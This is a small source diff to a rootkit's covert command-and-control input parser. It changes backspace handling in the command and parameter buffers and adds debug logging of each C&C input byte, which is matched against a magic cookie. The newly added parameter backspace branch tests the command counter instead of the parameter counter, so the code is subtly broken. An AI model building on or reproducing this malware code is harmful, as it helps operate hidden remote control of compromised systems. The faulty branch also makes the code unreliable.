@@ -113,8 +113,7 @@ accept_command_input (char input)
 			command_buffer[command_counter] = '\0';
 			state = 2;
 			execute_command();
-		} else if(input == 8) {	/* backspace */
-			ROOTKIT_DEBUG("Backspace detected.\n");
+		} else if(input == 127) {	/* backspace */
 			if(command_counter > 0) {
 				memset(command_buffer + command_counter, 0, 1);
 				command_counter--;
@@ -146,6 +145,11 @@ void accept_param_input (char input)
 			param_counter = 0;
 
 			state = 0;		
+		} else if(input == 127) {	/* backspace */
+			if(command_counter > 0) {
+				memset(param_buffer + param_counter, 0, 1);
+				param_counter--;
+			}
 		} else {
 			param_buffer[param_counter] = input;
 			param_counter++;
@@ -165,6 +169,8 @@ void accept_param_input (char input)
 void
 accept_input (char input)
 {
+	ROOTKIT_DEBUG("C&C input detected: '%u'\n", input);	
+
 	if(state == 0) {
 		
 		if(magic_cookie[cstate] == input) {
